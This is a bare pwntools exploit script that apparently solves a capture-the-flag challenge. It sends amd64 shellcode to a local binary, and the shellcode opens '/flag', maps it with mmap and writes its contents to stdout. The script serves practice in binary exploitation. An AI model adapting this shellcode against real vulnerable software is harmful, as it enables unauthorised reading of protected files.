from pwn import *

r=process("./pwn")
gdb.attach(r)
pause()
pay1='''
	mov rax, 0x67616C662F
	push rax
	lea rdi, [rsp]
	mov rax, 2
	xor rsi, rsi
	syscall
	mov r8, rax
	mov rax, 9
	xor rdi, rdi
	mov rsi, 100
	mov rdx, 1
	mov r10, 2
	xor r9, r9
	call do_syscall
	mov rsi, rax
	mov rax, 1
	mov rdi, 1
	mov rdx, 100
	call do_syscall
do_syscall:
	syscall
	ret

'''
payload=asm(pay1,arch="amd64")
r.send(payload)
r.interactive()
